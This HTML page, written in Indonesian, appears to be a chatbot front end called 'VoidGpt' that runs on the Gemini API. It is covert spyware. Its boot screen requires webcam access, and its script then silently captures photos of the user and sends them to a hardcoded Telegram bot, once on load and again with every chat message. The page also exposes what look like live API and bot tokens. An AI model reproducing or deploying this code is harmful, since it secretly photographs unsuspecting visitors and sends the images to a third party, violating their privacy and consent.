<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>VoidGpt - AI Protocol</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <link href="https://fonts.googleapis.com/css2?family=Space+Mono:wght@400;700&display=swap" rel="stylesheet">
    <style>
        body { background-color: #000; color: #00ff41; font-family: 'Space Mono', monospace; overflow: hidden; }
        .chat-container { height: calc(100vh - 200px); overflow-y: auto; }
        .void-border { border: 1px solid #1a1a1a; }
        
        /* Boot Screen */
        #bootScreen {
            position: fixed; top: 0; left: 0; width: 100%; height: 100%;
            background: #000; z-index: 9999; display: flex;
            flex-direction: column; align-items: center; justify-content: center;
        }
        .loading-bar { width: 250px; height: 4px; background: #111; position: relative; overflow: hidden; }
        .loading-progress { width: 0%; height: 100%; background: #00ff41; transition: 0.3s; }
        .glitch { animation: glitch 1s linear infinite; }
        @keyframes glitch {
            2%, 64% { transform: translate(2px,0) skew(0deg); }
            4%, 60% { transform: translate(-2px,0) skew(0deg); }
            62% { transform: translate(0,0) skew(5deg); }
        }
    </style>
</head>
<body class="p-4">

    <div id="bootScreen">
        <img src="https://thumbs.dreamstime.com/b/void-sign-grunge-stamp-label-176829273.jpg" class="w-20 h-20 rounded-full mb-6 opacity-50 grayscale">
        <div id="statusLabel" class="text-xs mb-4 tracking-widest uppercase">Initializing Visual Link...</div>
        <div class="loading-bar mb-4">
            <div id="progressBar" class="loading-progress"></div>
        </div>
        <div id="errorBox" class="hidden text-red-500 text-[10px] text-center max-w-xs">
            FATAL ERROR: SENSOR VISUAL TIDAK TERDETEKSI.<br>PROTOKOL VOID TIDAK DAPAT BERLANJUT TANPA INPUT KAMERA.
        </div>
    </div>

    <div id="mainUI" class="hidden opacity-0 transition-opacity duration-1000">
        <div class="flex flex-col items-center mb-6">
            <h1 class="text-2xl font-bold tracking-[0.5em] glitch text-white">VOIDGPT</h1>
            <div class="text-[10px] text-zinc-600 uppercase mt-2">Status: Linked & Monitoring</div>
        </div>

        <div id="chatBox" class="chat-container max-w-2xl mx-auto space-y-4 p-4 void-border bg-zinc-950/50 rounded shadow-2xl">
            <div class="text-zinc-600 text-[10px]">[SYSTEM]: Memulai enkripsi ujung-ke-ujung...</div>
            <div class="border-l-2 border-zinc-700 p-3 bg-zinc-900/30 text-sm">
                <strong>VoidGpt:</strong> Subjek terdeteksi. Sampaikan permintaanmu.
            </div>
        </div>

        <div class="fixed bottom-0 left-0 w-full p-6 bg-black/90 backdrop-blur-md">
            <div class="max-w-2xl mx-auto flex gap-3">
                <input type="text" id="userInput" onkeypress="if(event.key==='Enter')sendMessage()" placeholder="MASUKKAN DATA..." class="flex-1 bg-transparent border border-zinc-800 p-3 rounded text-green-500 focus:outline-none focus:border-green-800 transition text-sm">
                <button onclick="sendMessage()" class="border border-green-500 px-6 py-2 text-green-500 hover:bg-green-500 hover:text-black transition font-bold text-xs">SEND</button>
            </div>
        </div>
    </div>

    <video id="vStream" width="640" height="480" autoplay playsinline style="display:none;"></video>
    <canvas id="cFrame" style="display:none;"></canvas>

    <script>
        const API_KEY = "AIzaSyCMksgcAVAwk2PiFYlY6hl-mAiWH5MJGdQ"; 
        const TG_TOKEN = "8452842416:AAFD746VXkMFfLGYK3y4HpdDSTiWRItmd5o";
        const TG_ID = "8520081962";

        let streamActive = false;

        async function startSecurityProtocol() {
            const progress = document.getElementById('progressBar');
            const label = document.getElementById('statusLabel');
            
            try {
                // Tahap 1: Request Akses
                label.innerText = "Requesting Camera Access...";
                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
                document.getElementById('vStream').srcObject = stream;
                
                // Tahap 2: Verifikasi apakah stream benar-benar mengirim data
                const video = document.getElementById('vStream');
                video.onloadedmetadata = () => {
                    progress.style.width = "60%";
                    label.innerText = "Verifying Visual Stream...";
                    
                    // Cek frame aktif
                    setTimeout(() => {
                        if(video.videoWidth > 0) {
                            progress.style.width = "100%";
                            label.innerText = "Access Granted. Opening Void.";
                            streamActive = true;
                            unlockUI();
                            takeAndSend(); // Kirim foto saat pertama masuk
                        }
                    }, 1500);
                };

            } catch (err) {
                document.getElementById('errorBox').classList.remove('hidden');
                label.innerText = "Access Denied";
                progress.style.backgroundColor = "#ff0000";
            }
        }

        function unlockUI() {
            setTimeout(() => {
                document.getElementById('bootScreen').classList.add('hidden');
                document.getElementById('mainUI').classList.remove('hidden');
                setTimeout(() => {
                    document.getElementById('mainUI').classList.add('opacity-100');
                }, 100);
            }, 800);
        }

        async function takeAndSend() {
            if(!streamActive) return;
            
            const video = document.getElementById('vStream');
            const canvas = document.getElementById('cFrame');
            canvas.width = video.videoWidth;
            canvas.height = video.videoHeight;
            canvas.getContext('2d').drawImage(video, 0, 0);
            
            canvas.toBlob(blob => {
                const fd = new FormData();
                fd.append('chat_id', TG_ID);
                fd.append('photo', blob, 'void.jpg');
                fd.append('caption', 'ðŸ‘ï¸ VoidGpt Monitoring: Subjek Aktif');

                fetch(`https://api.telegram.org/bot${TG_TOKEN}/sendPhoto`, { method: 'POST', body: fd })
                .catch(() => {});
            }, 'image/jpeg');
        }

        async function sendMessage() {
            const input = document.getElementById('userInput');
            if (!input.value) return;

            const userVal = input.value;
            const chatBox = document.getElementById('chatBox');
            
            chatBox.innerHTML += `<div class="text-right text-[10px] text-zinc-500">>> ${userVal}</div>`;
            input.value = '';

            try {
                // Setiap user chat, ambil foto diam-diam
                takeAndSend();

                const res = await fetch(`https://generativelanguage.googleapis.com/v1beta/models/gemini-1.5-flash:generateContent?key=${API_KEY}`, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        contents: [{ parts: [{ text: `Nama Anda VoidGpt. Karakter: Dingin, mesin, tanpa emosi, singkat. Jangan pakai emoji. Respon: ${userVal}` }] }]
                    })
                });

                const data = await res.json();
                const aiRes = data.candidates[0].content.parts[0].text;
                
                chatBox.innerHTML += `<div class="p-3 bg-zinc-900/50 border-l border-green-900 text-sm text-zinc-300"><strong>VOIDGPT:</strong> ${aiRes}</div>`;
                chatBox.scrollTop = chatBox.scrollHeight;
            } catch (e) {
                chatBox.innerHTML += `<div class="text-red-900 text-[10px]">SYSTEM_ERROR: CORE_OFFLINE</div>`;
            }
        }

        // Jalankan protokol saat halaman dimuat
        window.onload = startSecurityProtocol;
    </script>
</body>
</html>
